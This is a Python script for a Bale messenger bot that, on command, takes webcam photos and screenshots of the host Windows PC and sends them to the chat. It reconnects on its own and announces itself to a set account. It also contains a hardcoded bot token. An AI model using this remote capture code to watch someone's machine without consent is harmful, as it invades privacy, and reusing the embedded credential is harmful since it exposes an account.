# python-bale-bot version: 2.5.0
# <User is_bot=True, first_name='Faraz_bot', username='Faraz_bot', id=1151667833>

from bale import Bot, Update, Message, InputFile
from bale import InlineKeyboardMarkup, InlineKeyboardButton, MenuKeyboardMarkup, MenuKeyboardButton
from balethon import Client # for sending message to spesific id
import os
import pyautogui
import time

client = Bot(token="1151667833:sGpf1ZgGjDZzc1JSwkEIskGaFF7ha2LsIfSCujfv")

# difining the keyboard layout ...
keyboard_text = '< - - - - - - - - - - - - - - - - - - - - - - >'
keyboard = (MenuKeyboardMarkup()
            .add(MenuKeyboardButton('/camera'), row=1)
            .add(MenuKeyboardButton('/screen'), row=2))

while True:
    try:
        # using balethon to send a message to a specific id ...
        bot = Client("1151667833:sGpf1ZgGjDZzc1JSwkEIskGaFF7ha2LsIfSCujfv")  # Replace "TOKEN" with your actual token here
        bot.connect()
        bot.send_message("@farazmlz", "* --- [ bot is active ] ---*\nsend /start to see the commands availble.")  # Replace "@username" with your actual username here

        os.system('cls')
        # show when the bot is ready ...
        @client.event
        async def on_ready():
            print(f" <--- [{client.user.first_name}] is Ready ---> ")


        @client.event
        async def on_message(message: Message):

            if message.content == "/camera":

                await message.reply('loading ...')

                # get the file location ---
                location = os.getcwd()
                
                file_path = location + "\\tools"
                print('-> file path is ' + file_path)
                # creating tool folder in desktop...
                if not os.path.exists(file_path): # check for existing of folder tools
                    os.makedirs(file_path)

                import cv2 as cv
                # initialize the camera ---
                cam_port = 0
                # cam_port = 1
                # cam = cv.VideoCapture(cam_port, cv.CAP_DSHOW) # this is for main cam
                cam = cv.VideoCapture(cam_port) # this is for secondary cam

                # reading the input using the camera
                result, image = cam.read()

                # If image will detected without any error, show result
                if result:
                    # saving image in local storage
                    loc = file_path + '\camera.png'
                    cv.imwrite(loc, image)
                    # cv.imwrite(r'C:\Users\Ravis\Desktop\tools\camera.png', image)

                # If captured image is corrupted, moving to else part
                else:
                    print("No image detected. Please! try again")

                # sending photo ---
                file = open(file_path + '\\camera.png', 'rb').read()
                photo = InputFile(file)
                await message.reply_photo(photo=photo, caption="Front Camera")

                # showing the keyboard ...
                await message.reply(
                    keyboard_text,
                    components = keyboard
                )
            

            elif message.content == "/screen":
                await message.reply('loading ...')

                # creating tool folder in desktop...
                if not os.path.exists(r'C:\Users\Ravis\Desktop\tools'): # check for existing of folder tools
                    os.makedirs(r'C:\Users\Ravis\Desktop\tools')
                # taking and sending the screen shot ...
                myScreenshot = pyautogui.screenshot()
                myScreenshot.save(r'C:\Users\Ravis\Desktop\tools\screen.png')

                # sending photo ---
                file = open(r'C:\Users\Ravis\Desktop\tools\screen.png', 'rb').read()
                photo = InputFile(file)
                await message.reply_photo(photo=photo, caption="screen")

                # showing the keyboard ...
                await message.reply(
                    keyboard_text,
                    components = keyboard
                )
                

            elif message.content == "/start":
                # showing the keyboard ...
                await message.reply(
                    keyboard_text,
                    components = keyboard
                )

            elif message.content == "/location":
                # showing the keyboard ...
                await message.reply(
                    keyboard_text,
                    components = keyboard
                )

            else:
                await message.reply('sorry, i dont know it\npress /start if you need a help.')


        # print(' ... < Bot Activated > ...\n')
        client.run()

    except:
        os.system('cls')
        # ! your code here --->
        print(" No internet Connection ... \n")
        # ! ------------------>

    delay_sec = 20
    for i in range(delay_sec, 0, -1):
        print(" ", "\r", end=' ')
        print("reconnecting in [" + str(i) + "] sec ", "\r", end=' ')
        time.sleep(1)
